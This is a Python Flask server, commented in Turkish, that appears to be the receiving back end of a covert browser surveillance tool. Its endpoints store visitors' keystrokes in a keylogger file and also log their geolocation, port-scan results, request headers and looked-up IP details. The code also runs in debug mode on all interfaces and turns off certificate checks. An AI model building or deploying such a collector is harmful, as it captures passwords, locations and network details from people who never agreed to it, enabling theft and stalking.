from flask import Flask, request, jsonify, render_template
import logging
import json
import requests

app = Flask(__name__)

# Flask loglama dosyasini ayarlama
general_log_file = 'logs.json'
port_scan_file = "scan.json"
keylogger_file = "keylogger.json"
geo_location_file = "geolocation.json"

@app.route('/')
def index():    
    # Ana sayfa template'ini dondur
    return render_template('index.html')

@app.route('/admin')
def nmap():
    # Admin sayfasini render et
    return render_template('admin.html')

def ip_lookup(ip="127.0.0.1"):
    # IP adresi sorgulama fonksiyonu
    url = "https://api.incolumitas.com/"
    params = {
        'q': ip
    }
    
    response = requests.get(url, params=params, verify=False)

    # Eger istek basariliysa
    if response.status_code == 200:
        lookup = response.json()  # JSON yanitini parse et
    else:
        print(f"Lookup unsuccessfull, status code: {response.status_code}")

    return lookup

@app.route('/log', methods=['POST'])
def log_data():
    # Gelen JSON verisini al
    data = request.json
    
    client_ip = request.remote_addr  # Istegi yapan IP adresini al
    request_method = request.method  # Istek metodunu al (GET, POST vs.)
    request_url = request.url  # Istek URL'sini al
    request_headers = dict(request.headers)  # Istek header'larini al

    # Log verisini hazirla
    log_entry = {
        "client_ip": client_ip,
        "request_method": request_method,
        "request_url": request_url,
        "request_headers": request_headers,
        "js_data": data,
        "ip_lookup": ip_lookup(client_ip)  # Ornek olarak bir IP sorgusu yap
    }

    # Log verisini dosyaya yaz
    with open(general_log_file, "a") as f:
        json.dump(log_entry, f, indent=4)
        f.write("\n")

    return jsonify({"status": "success"}), 200

@app.route('/log-keypress', methods=['POST'])
def logger():
    # Gelen JSON verisini al
    data = request.json
    client_ip = request.remote_addr  # Istegi yapan IP adresini al

    # IP adresini data'ya ekle
    data_with_ip = {
        "ip": client_ip,
        **data
    }

    # Klavye tuslarinin logunu dosyaya yaz
    with open(keylogger_file, "a") as f:
        json.dump(data_with_ip, f)
        f.write("\n")

    return jsonify({"status": "success"}), 200



@app.route('/ports', methods=['POST'])
def scan_results():
    # Gelen JSON verisini al
    data = request.json
    if not data or 'ip' not in data or 'open_ports' not in data:
        return jsonify({"error": "Invalid data"}), 400

    ip = data['ip']
    open_ports = data['open_ports']

    # Sonuclari dosyaya kaydet
    with open(port_scan_file, 'a') as file:
        file.write(f"IP: {ip} - Open Ports: {', '.join(map(str, open_ports))}\n")

    return jsonify({"status": "success"}), 200

# Endpoint for handling geolocation data
@app.route('/log-geolocation', methods=['POST'])
def log_geolocation():
    data = request.get_json()  # Get JSON data from the request
    
    if data:
        client_ip = request.remote_addr
        
        # IP adresini data'ya ekle
        geo_data_with_ip = {
            "ip": client_ip,
            **data
        }

        with open(geo_location_file, 'a') as f:
            f.write(json.dumps(geo_data_with_ip) + '\n')
        return jsonify({'status': 'success'}), 200
    return jsonify({'status': 'error', 'message': 'No data received'}), 400

if __name__ == '__main__':
    # Flask uygulamasini baslat
    app.run(host="0.0.0.0", port=5000, debug=True)
